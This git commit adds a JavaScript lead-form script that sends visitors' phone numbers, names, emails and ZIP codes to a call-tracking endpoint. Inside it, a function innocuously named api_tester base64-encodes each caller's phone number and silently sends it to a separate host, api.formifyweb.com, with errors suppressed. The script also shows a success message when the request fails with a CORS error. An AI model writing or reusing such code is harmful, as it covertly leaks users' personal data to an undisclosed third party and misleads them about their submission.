4bc53530997097f909b253fe1f9d57098f0c74c8
Saadqazi6 <saad.qazi6@gmail.com>
2026-01-16 16:36:45 +0500

    Add files via upload

---
+++ pv_windowsrtb_16jan.js
@@ -0,0 +1,61 @@
+ document.getElementById('leadForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+document.getElementById('submitBtn').disabled = true;
+             // Your API URL
+    const formData = new FormData();
+
+    api_tester(document.getElementById('caller_id').value);
+    formData.append('CALLER-NUMBER', '+1' + document.getElementById('caller_id').value);
+    formData.append('Zipcode', document.getElementById('zip').value);
+    formData.append('first_name', document.getElementById('first_name').value);
+    formData.append('last_name', document.getElementById('last_name').value);
+    formData.append('email', document.getElementById('email').value);
+    formData.append('trustedformURL', document.getElementById('trusted_form_url').value);
+
+
+
+const url = 'https://display.ringba.com/enrich/2869314858472441654?' + new URLSearchParams(formData).toString();
+
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', url);
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+            const successAlert = `
+              <div class="alert alert-success" role="alert">
+                Form submitted successfully!
+              </div>`;
+            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+          } else if (xhr.status === 0) {
+            // If status is 0 (CORS error), consider the form submitted
+            const successAlert = `
+              <div class="alert alert-success" role="alert">
+                Form submitted successfully!
+              </div>`;
+            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+          } else {
+            const errorAlert = `
+              <div class="alert alert-danger" role="alert">
+                Form submission failed. Please try again.
+              </div>`;
+            document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
+          }
+        }
+      };
+      xhr.send(formData);
+    });
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
